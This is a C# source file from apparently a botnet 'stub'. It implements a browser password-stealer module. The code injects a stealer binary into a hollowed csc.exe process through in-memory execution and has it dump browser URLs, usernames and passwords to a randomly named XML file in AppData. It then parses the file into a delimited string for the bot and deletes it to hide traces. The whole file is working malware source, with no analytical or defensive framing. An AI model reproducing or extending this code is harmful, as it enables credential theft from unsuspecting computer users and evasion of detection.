using System;
using System.Collections.Generic;
using System.Text;

using Stub.Core.RunPE;
using Stub.Utilities;
using System.Xml;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace Stub.Core.Modules.Stealer
{
    struct SPassword
    {
        public String strBrowser, strURL, strUsername, strPassword;

        public override string ToString()
        {
            return String.Format("{0}*{1}*{2}*{3};", strBrowser, strURL, strUsername, strPassword);
        }
    }
    class CPasswordStealer
    {
        static int iStealerPID = -1;

        static bool InjectStealer(String strPasswordFilename)
        {

            if (CBot.BotConfig.Stealer_Binary == null)
            {
#if DEBUG
                CBot.BotConfig.Stealer_Binary = CStealerStructure.arr_bArray;
#else
                return false;
#endif
            }
            try
            {
                if (CMemoryExecute.Run(CBot.BotConfig.Stealer_Binary, CUtils.GetSystemDir() + @"Microsoft.NET\Framework\v2.0.50727\csc.exe", String.Format("/sxml {0}", strPasswordFilename), out iStealerPID))
                {
                    if (iStealerPID != 1)
                    {
                        CBot.BotConfig.Stealer_Binary = null;
                        return true;
                    }
                    else return false;
                }
            }
            catch { }
            return false;
        }

        public static String GetPasswords()
        {
            String strPasswords = String.Empty;
            try
            {
                String strRandomFilename = String.Format("{0}.xml", String.Concat(CUtils.GetAppData(), CUtils.RandomString(CUtils.RandomInt(5, 15))));
                
                if(InjectStealer(strRandomFilename))
                {
                    try
                    {
                        Process pStealer = Process.GetProcessById(iStealerPID);

                        pStealer.WaitForExit();
                    }
                    catch { }

                    if (!File.Exists(strRandomFilename))
                    {
                        return strPasswords;
                    }

                    try
                    {
                        using(XmlReader PasswordReader = XmlReader.Create(strRandomFilename))
                        {
                            SPassword CurrentPassword = new SPassword();

                            while(PasswordReader.Read())
                            {
                                if(PasswordReader.IsStartElement())
                                {
                                    switch(PasswordReader.Name)
                                    {
                                        case "url":
                                            if(PasswordReader.Read())
                                            {
                                                CurrentPassword.strURL = PasswordReader.Value.Trim();
                                            }
                                            break;
                                        case "web_browser":
                                            if(PasswordReader.Read())
                                            {
                                                CurrentPassword.strBrowser = PasswordReader.Value.Trim();
                                            }
                                            break;
                                        case "user_name":
                                            if(PasswordReader.Read())
                                            {
                                                CurrentPassword.strUsername = PasswordReader.Value.Trim();
                                            }
                                            break;
                                        case "password":
                                            if(PasswordReader.Read())
                                            {
                                                CurrentPassword.strPassword = PasswordReader.Value.Trim();

                                                strPasswords += CurrentPassword.ToString();

                                                CurrentPassword = new SPassword();
                                            }
                                            break;
                                        default: break;
                                    }
                                }
                            }
                        }
                    }
                    catch
                    {
                    	
                    }

                    if (File.Exists(strRandomFilename)) File.Delete(strRandomFilename);
                }
            }
            catch { }

            return strPasswords;
        }
    }
}
